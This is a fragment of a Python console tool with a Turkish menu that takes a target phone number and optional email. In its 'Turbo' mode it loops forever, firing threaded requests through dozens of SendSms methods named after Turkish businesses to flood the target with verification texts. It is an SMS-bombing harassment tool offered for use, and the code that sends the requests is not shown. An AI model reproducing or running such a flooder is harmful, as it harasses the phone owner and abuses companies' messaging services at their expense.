...
while 1:  # line:15
    ...
    try:
        menu = input(Fore.LIGHTBLUE_EX + " 1- SMS Gönder " + Fore.LIGHTGREEN_EX + "(Normal) " + Fore.LIGHTRED_EX + " |  " +
                     Fore.LIGHTBLUE_EX + " 2- SMS Gönder " + Fore.LIGHTYELLOW_EX + "(Turbo)  "+ Fore.LIGHTRED_EX + " |  " + 
                     Fore.LIGHTRED_EX + " 3- Çıkış  \n" +
                     "\n"
                     "                          " + Fore.LIGHTCYAN_EX + "    Seçim: ")  # line:30
        if menu == "":  # line:31
            continue  # line:32
    ...
    elif menu == 2:  # line:128
        system("cls||clear")  # line:129
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: " + Fore.LIGHTGREEN_EX, end="")  # line:130
        tel_no = input()  # line:131
        try:  # line:132
            int(tel_no)  # line:133
            if len(tel_no) != 10:  # line:134
                raise ValueError  # line:135
        except ValueError:  # line:136
            system("cls||clear")  # line:137
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.")  # line:138
            sleep(3)  # line:139
            continue  # line:140

        system("cls||clear")  # line:141
        try:  # line:142
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): " + Fore.LIGHTGREEN_EX, end="")  # line:143
            mail = input()  # line:144
            if ("@" not in mail or ".com" not in mail) and mail != "":  # line:145
                raise  # line:146
        except:  # line:147
            system("cls||clear")  # line:148
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.")  # line:149
            sleep(3)  # line:150
            continue  # line:151

        system("cls||clear")  # line:152
        send_sms = SendSms(tel_no, mail)  # line:153
        try:  # line:154
            while True:  # line:155
                with ThreadPoolExecutor() as executor:  # line:156
                    futures = [executor.submit(send_sms.Akasya), executor.submit(send_sms.Akbati),
                               executor.submit(send_sms.Ayyildiz), executor.submit(send_sms.Baydoner),
                               executor.submit(send_sms.Beefull), executor.submit(send_sms.Bim),
                               executor.submit(send_sms.Bisu), executor.submit(send_sms.Bodrum),
                               executor.submit(send_sms.Clickme), executor.submit(send_sms.Dominos),
                               executor.submit(send_sms.Englishhome), executor.submit(send_sms.Evidea),
                               executor.submit(send_sms.File), executor.submit(send_sms.Frink),
                               executor.submit(send_sms.Happy), executor.submit(send_sms.Hayatsu),
                               executor.submit(send_sms.Hey), executor.submit(send_sms.Hizliecza),
                               executor.submit(send_sms.Icq), executor.submit(send_sms.Ipragaz),
                               executor.submit(send_sms.Istegelsin), executor.submit(send_sms.Joker),
                               executor.submit(send_sms.KahveDunyasi), executor.submit(send_sms.KimGb),
                               executor.submit(send_sms.Komagene), executor.submit(send_sms.Koton),
                               ...
                               executor.submit(send_sms.Tazi), executor.submit(send_sms.TiklaGelsin),
                               executor.submit(send_sms.ToptanTeslim), executor.submit(send_sms.Ucdortbes),
                               executor.submit(send_sms.Uysal), executor.submit(send_sms.Wmf),
                               executor.submit(send_sms.Yapp), executor.submit(send_sms.YilmazTicaret),
                               executor.submit(send_sms.Yuffi)]  # line:211
